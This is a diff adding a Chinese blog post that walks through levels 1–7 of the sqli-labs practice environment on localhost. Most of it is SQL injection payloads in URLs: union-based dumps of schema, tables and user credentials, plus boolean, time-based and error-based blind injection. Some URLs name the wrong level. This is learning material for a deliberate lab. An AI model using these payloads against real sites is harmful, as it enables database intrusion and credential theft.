@@ -134,6 +134,294 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Sqli-labs 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/">Sqli-labs(第1-10关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/" class="archive-article-date">
+  	<time datetime="2019-01-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前就有学习过一些关卡，但是由于当时没有搭建博客的想法，所以也就没有写下来属于自己的笔记。现在博客搭建完成了，从第一关开始，重新写下所有关卡的笔记，并且向后学习。</p>
+<p>关于SQL注入的基础知识，可以看我自己整理的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
+<h2 id="数据库名、表名、列名"><a href="#数据库名、表名、列名" class="headerlink" title="数据库名、表名、列名"></a>数据库名、表名、列名</h2><p>因为是学习用的，所以先告诉大家这个基于<strong>phpstudy</strong>搭建的<strong>sqli-labs</strong>学习过程中，较频繁使用的重要的数据库名、表名、列名：</p>
+<p>数据库名：security</p>
+<p>security下的表名：emails，referers，uagents，users</p>
+<p>users下的列名：id，username，password</p>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less - 1"></a>Less - 1</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。ps：注意后面这个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-1.png" alt="1-1"></p>
+<p>查看 <code>index.php</code> 文件内对于参数<code>ID</code>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<code>单引号</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>既然多了一个<code>单引号</code>会出现报错，那想办法将这个单引号去掉，会不会不报错并且正常显示呢，试一下 <code>&#39; or 1=1 --+</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，sql语句就会变成如下这样，这条语句因or 1=1所以为永恒真</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos; or 1=1 --+&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>回车后就可以看到返回的内容：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-2.png" alt="1-2"></p>
+<p>可以看到我们通过 <strong>–+</strong> 将这个多出来的<strong>单引号</strong>给注释掉了，成功返回内容</p>
+<p>那么我们就可以利用这点，执行其他我们想要执行的语句，比如 <strong>order by</strong>  (关于order by 开头有做简单介绍)</p>
+<p>首先，我们看到 <strong>security-users</strong> 表有3列</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-3.png" alt="1-3"></p>
+<p>如果我们执行 <strong>order by 3</strong> 就会成功，如果超过3就会失败，比如 <strong>order by 4</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 4 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-4.png" alt="1-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-5.png" alt="1-5"></p>
+<p>那么此时我们就知道了，可以利用这一点来猜某个表中有多少列</p>
+<p>当id的数据在数据库中不存在时，前台页面返回了我们构造的union 的数据。此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4 --+</span><br></pre></td></tr></table></figure>
+<p><strong>注意</strong>：因为前面我们已经通过 <strong>order by 3</strong> 知道该表有3列，所以这里要 <strong>select 1,2,3</strong> 不然会出错</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-6.png" alt="1-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-7.png" alt="1-7"></p>
+<p>此时我们就可以利用显示的位置，然后通过利用文章开头介绍的<strong>常用函数</strong>，来获取我们需要的信息，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,version(),database() --+</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,@@version_compile_os,@@datadir --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-8.png" alt="1-8"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-9.png" alt="1-9"></p>
+<p>结合前面的关于 <strong>information_schema</strong>  的知识，利用 <strong>union</strong> 命令进行联合注入（层层深入）</p>
+<p>爆所有数据库名（第一层）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-10.png" alt="1-10"></p>
+<p>爆security数据库的所有表名（第二层）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos; --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-11.png" alt="1-11"></p>
+<p>爆users表的所有列名（第三层）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-12.png" alt="1-12"></p>
+<p>爆具体数据（第四层）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,username,password from users where id=1--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,username,password from users where id=1--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-13.png" alt="1-13"></p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less - 2"></a>Less - 2</h2><p>同样的构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-1.png" alt="2-1"></p>
+<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。因此我们得出的结果是，查询代码使用了整数</p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=1&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>所以这关就不需要对<strong>单引号</strong>的问题进行处理，直接尝试进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-2.png" alt="2-2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-3.png" alt="2-3"></p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less - 3"></a>Less - 3</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-1.png" alt="3-1"></p>
+<p>因此我们得出的结果是，查询代码使用了 <strong>(‘id’)</strong> 对参数进行了处理</p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;1&apos;&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>所以这关就需要通过处理掉这个<strong>(‘$id’)</strong>，尝试进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=-1&apos;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-2.png" alt="3-2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-3.png" alt="3-3"></p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less - 4"></a>Less - 4</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。发现没有返回报错信息，并尝试<strong>两个单引号</strong>，也是如此.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-1.png" alt="4-1"></p>
+<p>知道将<strong>单引号</strong>改成<strong>双引号</strong>报错信息才出现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-2.png" alt="4-2"></p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>双引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&quot;id&quot;&quot;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>尝试进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-3.png" alt="4-3"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-4.png" alt="4-4"></p>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less - 5"></a>Less - 5</h2><p>这关开始，后面的几关开始接触到盲注了。关于盲注的知识可以看这篇博客的Tip 2部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
+<p>老规矩，构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-1.png" alt="5-1"></p>
+<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。</p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>（1）布尔注入</p>
+<p>使用<strong>length()函数</strong>猜测数据库的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=7 --+</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-3.png" alt="5-3"></p>
+<p>使用<strong>substr()函数</strong>猜测数据库的名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;a&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;a&apos;</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;s&apos;</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;s&apos;</span><br><span class="line"></span><br><span class="line">同样，改变substr()函数里的参数，就可以截取想要猜测的字符，就这样一个个字符爆出来</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,5)=&apos;secur&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,8)=&apos;security&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),3,6)=&apos;curity&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-4.png" alt="5-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-5.png" alt="5-5"></p>
+<p>当然也可以使用这种方法来<strong>爆表名、列名、数据</strong>等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;a&apos; --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos; --+</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,6)=&apos;emails&apos; --+</span><br><span class="line">//当猜测出第一个表之后，改成limit 1,1 就可以猜测第二个表。关于limit的用法，不懂的话记得看前面有链接的Tips文章</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-6.png" alt="5-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-7.png" alt="5-7"></p>
+<p>（2）报错注入</p>
+<p>xpath报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line">//爆数据库名称</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-8.png" alt="5-8"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">//爆表名称，同样改变limit的变量去看每个表</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-9.png" alt="5-9"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-10.png" alt="5-10"></p>
+<p>（3）延时注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br><span class="line">//等待了5秒后，返回空白</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,8)=&apos;security&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-11.png" alt="5-11"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-12.png" alt="5-12"></p>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less - 6"></a>Less - 6</h2><p>第6关与第5关不同就是对参数ID的处理不同了，变成<strong>一个双引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-1.png" alt="6-1"></p>
+<p>我们使用xpath报错注入试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select username from users where id=2),0x3a)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select password from users where id=2),0x3a)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-2.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-3.png" alt="6-3"></p>
+<p>其他的内容和第5关一样，只是<strong>单引号</strong>改成<strong>双引号</strong>，这里就不再赘述了</p>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less - 7"></a>Less - 7</h2><p>这关接触到了<strong>dump into outfile</strong>。关于这部分知识点可以看这篇博客的Tip 3部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
